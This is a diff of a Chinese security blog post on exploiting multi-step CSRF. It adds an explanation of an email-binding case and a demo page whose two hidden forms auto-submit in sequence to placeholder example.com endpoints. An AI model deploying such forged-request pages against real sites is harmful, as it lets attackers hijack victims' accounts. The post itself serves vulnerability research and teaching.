@@ -22,7 +22,7 @@ CSRF的漏洞原理和利用方式这里就不多赘述了。平时大家讨论�
 CSRF的漏洞原理和利用方式这里就不多赘述了。平时大家讨论的CSRF利用多是发送一次请求。比如CSRF刷粉丝，CSRF发微博。这里主要讨论一个稍微复杂点的利用场景。
 最近在众测的时候遇到一个案例，用户绑定邮箱的请求没有防御CSRF。但是大家都知道绑定邮箱这个操作不是一步完成了。这次遇到的这个案例是这样的。用户发送一个申请绑定邮箱的请求，服务器给该邮箱发送一个验证">
 <meta property="og:image" content="http://xdxd.love/images/mulcsrf1.jpg">
-<meta property="og:updated_time" content="2015-12-25T01:53:07.000Z">
+<meta property="og:updated_time" content="2015-12-25T01:54:10.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="多步csrf漏洞场景及其利用">
 <meta name="twitter:description" content="发布在了Freebuf上，有删改。
@@ -111,7 +111,25 @@ CSRF的漏洞原理和利用方式这里就不多赘述了。平时大家讨论�
 <p>CSRF的漏洞原理和利用方式这里就不多赘述了。平时大家讨论的CSRF利用多是发送一次请求。比如CSRF刷粉丝，CSRF发微博。这里主要讨论一个稍微复杂点的利用场景。</p>
 <p>最近在众测的时候遇到一个案例，用户绑定邮箱的请求没有防御CSRF。但是大家都知道绑定邮箱这个操作不是一步完成了。这次遇到的这个案例是这样的。用户发送一个申请绑定邮箱的请求，服务器给该邮箱发送一个验证码，然后用户在页面中输入验证码完成绑定。</p>
 <p><img src="/images/mulcsrf1.jpg" alt=""></p>
-  
+<p>从上图的路程中可以看出。按照常见的csrf的漏洞来说，这里是没法利用的。因为即使我们伪造了请求，让用户发出了绑定申请的邮件，还需要用户把这个验证码在页面上输入才行。经过更进一步的分析发现，图中4这一步也是没有防御CSRF的。也就是说我们可以伪造两次请求来实现CSRF绑定邮箱。这样一个场景就是比较典型的多步CSRF。</p>
+<p>有了思路就可以开始写demo了。最初的想法：是不是用两个表单就可以了呢。</p>
+<pre><code><span class="tag">&lt;<span class="title">html</span>&gt;</span>
+<span class="tag">&lt;<span class="title">body</span>&gt;</span>
+<span class="tag">&lt;<span class="title">form</span> <span class="attribute">id</span>=<span class="value">"form1"</span> <span class="attribute">method</span>=<span class="value">"POST"</span>  <span class="attribute">action</span>=<span class="value">" https://www.example.com/first.aspx"</span>&gt;</span>
+<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"test1"</span> <span class="attribute">value</span>=<span class="value">"1"</span>&gt;</span>
+<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"submit"</span> <span class="attribute">value</span>=<span class="value">"form1"</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">form</span>&gt;</span>
+<span class="tag">&lt;<span class="title">form</span> <span class="attribute">id</span>=<span class="value">"form2"</span> <span class="attribute">method</span>=<span class="value">"POST"</span>  <span class="attribute">action</span>=<span class="value">" https://www.example.com/second.aspx"</span>&gt;</span>
+<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"test2"</span> <span class="attribute">value</span>=<span class="value">"2"</span>&gt;</span>
+<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"submit"</span> <span class="attribute">value</span>=<span class="value">"form2"</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">form</span>&gt;</span>
+<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
+<span class="built_in">document</span>.getElementById(<span class="string">"form1"</span>).submit();
+<span class="built_in">window</span>.setTimeout( <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>{ <span class="built_in">document</span>.forms.form2.submit()}, <span class="number">12000</span>); 
+</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">body</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">html</span>&gt;</span>
+</code></pre>  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
